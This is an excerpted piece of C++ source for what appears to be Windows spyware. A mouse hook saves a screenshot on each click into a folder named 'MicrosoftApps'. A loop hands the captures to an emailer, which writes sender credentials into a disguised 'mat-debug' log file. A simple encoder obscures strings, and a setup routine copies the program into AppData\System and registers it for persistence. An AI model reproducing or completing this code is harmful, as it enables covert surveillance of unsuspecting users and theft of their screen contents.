...
void createTextFile(const std::string& filename, const std::string& line1, const std::string& line2, const std::string& line3, const std::string& line4, const std::string& line5) {
	...
	WriteFile(file, line4.c_str(), (DWORD)line4.size(), &writtenBytes, NULL);
	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);

	WriteFile(file, line5.c_str(), (DWORD)line5.size(), &writtenBytes, NULL);
	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);
...
std::string Encode(std::string EncodedString) {
	std::string Ret = { NULL };
	std::string OtherString;
	Base64::encode(EncodedString, &Ret);
	for (int i = Ret.size() - 1; i >= 0; i--) {
		OtherString += Ret[i] + 1;
	}
	return OtherString.c_str();
}
...
void RunPS1File(const std::string& ZipPath1)
{
	...
	std::string Filename = "mat-debug-";
	Filename += std::to_string(rand() % 10000 + 1000);
	Filename += ".log";
	fullPath += "\\" + Filename;
	createTextFile(fullPath, SendersEmail, SendersPsw, ZipPath1, EmailSubject, EmailBody);
...
ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
	...
	while (1) {
		...
		if (!InternetGetConnectedState(&DWFlags, NULL)) {
			...
			std::thread t(RunPS1File, ZipPath1); 
			t.detach(); //takes approx 45 seconds for this to action. 
...
LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {
	...
	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
		...
		ScreenshotName += "\\MicrosoftApps\\SC_";
...
void FirstSetup() {
	...
	std::string DestinationFile(appDataPath);
	DestinationFile += "\\System";
	//std::string DestinationFile = "C:\\Users\\";
	//DestinationFile += UserName;
	//DestinationFile += "\\AppData\\Roaming\\System";
	...
	CreateRegistryKey("System", DestinationFile.c_str());
